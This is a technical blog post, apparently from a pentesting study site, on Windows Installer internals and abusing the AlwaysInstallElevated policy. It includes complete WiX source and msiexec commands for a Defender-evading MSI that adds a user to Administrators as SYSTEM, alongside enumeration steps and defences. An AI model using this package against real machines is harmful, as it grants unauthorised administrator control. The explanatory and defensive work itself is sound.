---
title: Windows Installer and AlwaysInstallElevated
layout: post
date: 2026-09-16
description: "How the Windows Installer service splits an installation into an immediate and a deferred phase, what the AlwaysInstallElevated policy actually changes, how custom action type codes decide who the payload runs as, and how to build a signature-free elevating MSI from Linux."
permalink: /theory/windows/msi/
---

# Windows Installer and AlwaysInstallElevated

## Overview

An MSI file is not a program. It is a small relational database, stored in the OLE compound-document format, whose tables describe files to copy, registry values to write, and *actions to execute*. The program that reads it is `msiexec.exe`, driving the **Windows Installer service** (`msiserver`), and that service runs as `LocalSystem`.

That split is the whole security story. The package is untrusted data supplied by whoever launched the install; the engine that interprets it is the most privileged process on the machine. Everything Windows Installer does about security is an attempt to decide *which parts of an untrusted package the privileged engine is allowed to act on*, and **AlwaysInstallElevated** is a policy that answers "all of it, for everyone".

## Two Phases, Two Security Contexts

A Windows Installer transaction runs in two passes over the `InstallExecuteSequence` table, and confusing them is the most common reason an abuse "does nothing".

**The immediate phase** runs first, in the process that invoked `msiexec`, under the *invoking user's* token. It reads the tables, evaluates conditions, computes costs, and resolves properties. It cannot change the machine, because nothing it does touches the system yet: instead it appends every action that *will* change the machine to an **execution script**.

**The deferred phase** runs that script. It is executed by the Windows Installer *service*, not by the user's `msiexec` process. When the installation is elevated, the service runs the script as `LocalSystem`.

The boundary sits at the standard action `InstallInitialize` (sequence 1500 in a typical package). Actions sequenced before it run immediately; actions after it that are marked deferred go into the script.

| Property | Immediate phase | Deferred phase |
|---|---|---|
| Runs in | Invoking `msiexec` process | Installer service |
| Identity | The user who ran the install | `LocalSystem` if elevated |
| Can set properties | Yes | No |
| Can read properties | Yes | Only `CustomActionData` |
| Position in sequence | Before `InstallInitialize` | After `InstallInitialize` |

The consequence for an attacker is exact: **a payload that must run as SYSTEM has to be a deferred action, and anything it needs to know has to be baked in before the boundary.**

## What AlwaysInstallElevated Changes

By default, an unprivileged user installing a package gets an unelevated install. Some parts are still allowed to run elevated (a *managed* application published by a domain administrator, or specific components marked for it), but an arbitrary MSI handed to `msiexec` by a standard user executes its deferred script as that same standard user. Nothing is gained.

`AlwaysInstallElevated` is a Group Policy setting, "Always install with elevated privileges", that removes the check. It exists so that a standard user can install a vendor package that needs machine-wide changes without an administrator being present, which is a real operational problem and a catastrophic answer to it.

It is stored as a `REG_DWORD` in two places:

```text
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  AlwaysInstallElevated = 1
```

**Both are required.** The machine half is the computer-configuration policy and the user half is the user-configuration policy, and Windows Installer deliberately requires the pair so that neither an administrator setting it machine-wide nor a user setting it in their own hive can enable it alone. In practice that safety is thin: the policy is almost always deployed through a GPO that sets both, because setting only one does nothing and the deploying administrator will keep going until it works.

Query them with `reg`, which needs no tooling on the target:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

A missing key returns `ERROR: The system was unable to find the specified registry key or value`, which is the normal, safe answer.

> Two `0x1` values in the registry are a complete local privilege escalation for **every** account that can log on to the host, with no exploit, no memory corruption, and no unpatched software. It is the clearest example of a misconfiguration whose severity has nothing to do with how hard it is to find and everything to do with what the vendor decided a policy should mean.
{: .prompt-danger }

## Custom Actions and the Type Code

A **custom action** is a row in the `CustomAction` table. Its `Type` column is a bit field, and reading that number tells you exactly what the action does and who it runs as. The low bits select the *kind* of action; the high bits are flags.

The kinds worth knowing:

| Value | Source field | Target field | What it does |
|---|---|---|---|
| `1` | Binary table key | Entry point | Call a DLL export |
| `2` | Binary table key | Command line | Run an EXE stored in the package |
| `18` | File table key | Command line | Run an EXE the package installed |
| `34` | Directory property | Command line | Run an EXE from a directory |
| `50` | Property name | Command line | Run the EXE whose path is in that property |
| `51` | Property name | New value | Set a property |
| `38` | Nothing | Script text | Run VBScript held in `Target` |

The flags that matter:

| Bit | Name | Meaning |
|---|---|---|
| `0x0040` (64) | `msidbCustomActionTypeContinue` | Ignore the return code |
| `0x0400` (1024) | `msidbCustomActionTypeInScript` | Deferred: goes into the execution script |
| `0x0800` (2048) | `msidbCustomActionTypeNoImpersonate` | Do not impersonate the installing user |
| `0x2000` (8192) | `msidbCustomActionTypeHideTarget` | Hide the command line from the log |

`msidbCustomActionTypeNoImpersonate` is the one that turns an elevated install into SYSTEM execution. Without it, a deferred action in an elevated install still impersonates the user who started it. With it, the action runs as the service identity, which is `LocalSystem`.

So a type code of **3186** decomposes as:

```text
3186 = 2048 (NoImpersonate) + 1024 (InScript / deferred) + 64 (Continue) + 50 (EXE from property)
```

which reads, in one number: *run the executable named by a property, as `LocalSystem`, during the deferred script, and do not fail the install if it returns non-zero.*

## Building a Signature-Free Elevating MSI from Linux

The reflex is `msfvenom -f msi`, and on any host with Microsoft Defender running that is the wrong reflex: those packages carry an embedded payload with well-known signatures and are detected on write.

The signature problem disappears entirely if the package contains no executable code. A type `50` custom action does not need an embedded binary: it runs whatever the property points at, and pointing it at `cmd.exe` is enough. The package then consists of a handful of database rows referencing a Microsoft-signed binary already on the target.

[msitools](https://gitlab.gnome.org/GNOME/msitools) provides `wixl`, a WiX-compatible compiler that runs natively on Linux:

```bash
cat > elevate.wxs << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="Setup" Language="1033" Version="1.0.0" Manufacturer="Microsoft" UpgradeCode="AABBCCDD-1234-5678-9012-AABBCCDDEEFF">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
    <MediaTemplate EmbedCab="yes" />
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="TempFolder">
        <Component Id="DummyComp" Guid="AABBCCDD-AAAA-BBBB-CCCC-DDEEFF001122">
          <CreateFolder />
        </Component>
      </Directory>
    </Directory>
    <Feature Id="Main" Level="1">
      <ComponentRef Id="DummyComp" />
    </Feature>
    <CustomAction Id="SetCmd" Property="RunCmd" Value="cmd.exe" />
    <CustomAction Id="RunCmd" Property="RunCmd" ExeCommand="/c net localgroup administrators lowpriv /add" Execute="deferred" Impersonate="no" Return="ignore" />
    <InstallExecuteSequence>
      <Custom Action="SetCmd" Before="RunCmd" />
      <Custom Action="RunCmd" After="InstallInitialize" />
    </InstallExecuteSequence>
  </Product>
</Wix>
EOF

wixl elevate.wxs -o elevate.msi
```

Three details in that source are load-bearing.

`SetCmd` is a type `51` property-setting action, and it is **not** a `<Property>` element. It has to be an action in the sequence because the `RunCmd` property must hold its value at the moment the immediate phase writes `RunCmd` into the execution script. Placing it `Before="RunCmd"` puts it at the very start of the sequence, long before `InstallInitialize`.

`Impersonate="no"` plus `Execute="deferred"` is what produces the `2048 + 1024` half of the type code. Drop either one and the payload runs as the unprivileged user, and the install will still report success.

The `Directory`/`Component`/`Feature` block is inert scaffolding. Windows Installer refuses to validate a package with no feature to install, so a `<CreateFolder />` component under `TempFolder` satisfies the schema without writing anything meaningful.

Verify the result against the database rather than trusting the compiler:

```bash
msiinfo export elevate.msi CustomAction
```

```text
Action	Type	Source	Target	ExtendedType
s72	i2	S72	S255	I4
CustomAction	Action
SetCmd	51	RunCmd	cmd.exe
RunCmd	3186	RunCmd	/c net localgroup administrators lowpriv /add
```

```bash
msiinfo export elevate.msi InstallExecuteSequence
```

```text
Action	Condition	Sequence
...
SetCmd		1
InstallInitialize		1500
RunCmd		1501
```

`SetCmd` at sequence `1`, `RunCmd` at `1501` immediately after `InstallInitialize` at `1500`, and a type of `3186`: the package is correct before it ever touches the target.

> `wixl` is a reimplementation, not WiX, and it does not accept the full WiX schema. `<SetProperty>`, the modern WiX shorthand for a type `51` action, fails outright with `unhandled child Product node SetProperty`. Writing the type `51` `<CustomAction>` by hand is the portable form.
{: .prompt-tip }

## Why Embedding a Binary Is Worse, Not Better

The intuitive design is to compile a small executable, embed it with `<File>`, and run it with a type `18` custom action. It is worse on both axes.

It reintroduces the signature problem: an unsigned binary whose only behaviour is adding an account to `Administrators` is exactly what behaviour-based detection is for, and it lands on disk under `Program Files` where it can be quarantined *between* `InstallFiles` and the custom action that runs it. When that happens, the install still reports success, because `Return="ignore"` swallows the failure and the deferred script has no way to report back.

It also inflates the package from around ten kilobytes to megabytes, and it makes failures much harder to diagnose, because there are now two places to be wrong: the tables and the binary. A property-based action fails only in the tables, and the tables can be read.

## Installing and Confirming

`msiexec` needs the package path and a quiet UI level:

```powershell
msiexec /quiet /qn /i C:\Users\lowpriv\elevate.msi
```

`/qn` sets the UI level to none; `/quiet` is its synonym, and passing both is harmless. A quiet install is not just about stealth: it prevents the package from stopping on a dialog that nobody is there to dismiss.

The return code is not the test. `Return="ignore"` means a failed custom action produces a successful install, so the only honest verification is an observable side effect:

```cmd
net localgroup administrators
```

If the target of the install is a group membership change, the new membership is **not** in the current token. Tokens are built at logon and are not refreshed when group membership changes, so the session that ran `msiexec` still holds its old, unprivileged token. Log off and back on, or start a new logon session, before expecting administrative rights. See [Logon Types and Privileges](/theory/windows/logon-and-privileges/) for why the account name is not the security context.

## Troubleshooting a Silent Failure

Windows Installer logs verbosely on request, and the log names the exact action that ran and what it returned:

```powershell
msiexec /i C:\Users\lowpriv\elevate.msi /qn /l*v C:\Users\lowpriv\msi.log
```

The lines worth searching for:

- `Doing action: RunCmd` confirms the action was reached at all.
- `Action start ... RunCmd.` followed by `Action ended ... Return value 1.` confirms it ran and succeeded.
- `MSI (s) (..:..)` prefixes are the *service* side of the log, meaning the deferred, potentially `LocalSystem` half; `MSI (c) (..:..)` is the client side running as the user. Seeing a payload only under `(c)` means it impersonated and never got SYSTEM.

## Finding It During Enumeration

`AlwaysInstallElevated` is checked by every mainstream local enumeration script, and it is one of the few findings those tools report with no false positives, because the check is two registry reads with no interpretation:

```powershell
. .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```

[PowerUp](https://github.com/PowerShellMafia/PowerSploit) surfaces it through `Invoke-AllChecks`, and [winPEAS](https://github.com/peass-ng/PEASS-ng) reports it under its "Windows Credentials / AlwaysInstallElevated" section. Doing the two `reg query` calls by hand takes less time than uploading either, and avoids putting a flagged script on the disk of a host that clearly has Defender running.

## Defence

- Never enable "Always install with elevated privileges". There is no configuration of it that is safe for a multi-user host; if standard users need to install approved software, publish it as a managed application or use an endpoint management agent that installs on their behalf.
- Audit for the policy directly. Both registry values are readable remotely and cheaply, and the presence of either one is worth an alert even though only the pair is exploitable, since a half-configured policy usually means somebody is mid-deployment.
- Watch for `msiexec` running packages from user-writable paths. A package under a user profile or `%TEMP%` being installed `perMachine` is an unusual shape for legitimate software.
- Treat MSI as executable content in your allow-listing policy. Windows Defender Application Control and AppLocker both have a dedicated Windows Installer rule collection precisely because a package is code.

## Examples on this site

Boxes that abuse Windows Installer, listed automatically from their tags (add a matching tag to `msi_tags` below to include a new one):

{% assign msi_tags = "alwaysinstallelevated,msi" | split: "," -%}
{% for post in site.posts -%}
{%- assign match = false -%}
{%- for t in post.tags -%}
{%- if msi_tags contains t -%}{%- assign match = true -%}{%- endif -%}
{%- endfor -%}
{%- if match %}
- [{{ post.title }}]({{ post.url }}){% endif -%}
{%- endfor %}

## References

- [Microsoft - Custom Action Types](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-types)
- [Microsoft - Deferred Execution Custom Actions](https://learn.microsoft.com/en-us/windows/win32/msi/deferred-execution-custom-actions)
- [Microsoft - AlwaysInstallElevated policy](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
- [Microsoft - Installation in Stages](https://learn.microsoft.com/en-us/windows/win32/msi/installation-in-stages)
- [msitools](https://gitlab.gnome.org/GNOME/msitools)
